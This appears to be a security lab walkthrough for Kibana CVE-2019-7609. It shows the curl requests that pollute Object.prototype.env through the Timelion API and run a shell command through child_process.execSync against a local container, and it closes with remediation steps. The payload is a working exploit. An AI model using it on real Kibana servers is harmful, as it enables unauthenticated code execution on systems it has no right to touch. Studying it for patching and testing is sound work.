# Kibana Timelion Server-Side Prototype Pollution RCE (CVE-2019-7609)

## Overview

Kibana is the open-source data exploration and visualization dashboard for Elasticsearch. In Kibana versions before 5.6.15 and 6.6.1, the Timelion visualizer contains an arbitrary code execution vulnerability. An unauthenticated attacker can exploit prototype pollution via the Timelion HTTP API to pollute Object.prototype.env and spawn child processes containing arbitrary shell commands.

- **Service Access**: `http://localhost:8155/`
- **Default Credentials**: `Unauthenticated`
- **Docker Shortcut**: `./lab start kibana-prototype-rce`
- **Container Name**: `cyberlab_02_kibana_prototype_rce`
- **RAM Footprint**: ~500M

---

## Exploitation Walkthrough

### 1. Verify Kibana Dashboard Availability

```bash
curl -i http://localhost:8155/app/kibana
```

### 2. Send Prototype Pollution Payload via Timelion Run API

```bash
curl -i -X POST 'http://localhost:8155/api/timelion/run' \
  -H 'kbn-version: 6.5.4' \
  -H 'Content-Type: application/json' \
  -d '{"sheet":[".es(*).props(label.__proto__.env.AAAA=\"require(\'child_process\').execSync(\'touch /tmp/pwned_kibana\')//\")"],"time":{"from":"now-15m","to":"now","mode":"quick","timezone":"Asia/Shanghai"}}'
```

### 3. Trigger Canvas / Reporting to Spawn Process

```bash
curl -i http://localhost:8155/api/canvas/ping
```

### 4. Verify Command Execution

```bash
docker exec -it cyberlab_02_kibana_prototype_rce ls -la /tmp/pwned_kibana
```

---

## Defensive Remediation & Hardening

1. Upgrade Kibana to version 5.6.15, 6.6.1, or higher.
2. Protect Kibana dashboard endpoints behind authentication proxies.
3. **Disable Timelion module if not required**:
   Disable Timelion module if not required: timelion.enabled: false.

---

## Video Walkthroughs & Technical References

- [Exploiting Prototype Pollution in JavaScript for Server-Side RCE](https://www.youtube.com/watch?v=9UAQ1VzSq8Q)
- [Elastic Security Advisory ESA-2019-02 (CVE-2019-7609)](https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169048)
- [Vulhub Kibana CVE-2019-7609 Environment](https://vulhub.org/#/environments/kibana/CVE-2019-7609/)
